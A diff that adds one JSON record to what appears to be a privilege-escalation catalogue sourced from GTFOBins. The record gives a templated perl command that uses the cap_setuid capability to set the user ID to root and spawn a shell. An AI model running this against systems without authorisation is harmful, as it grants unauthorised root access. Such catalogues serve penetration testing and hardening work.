@@ -1,0 +1,1 @@
+{"id":"cap_setuid_perl","category":"CAPABILITY_SETUID","binary":"perl","cve":null,"exploitation":["{{binary}} -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"{{shell}}\";'"],"post_exploit":["id"],"notes":"Binary must have cap_setuid+ep.","source":"gtfobins.github.io","tags":["capabilities","setuid"],"severity":"high"}
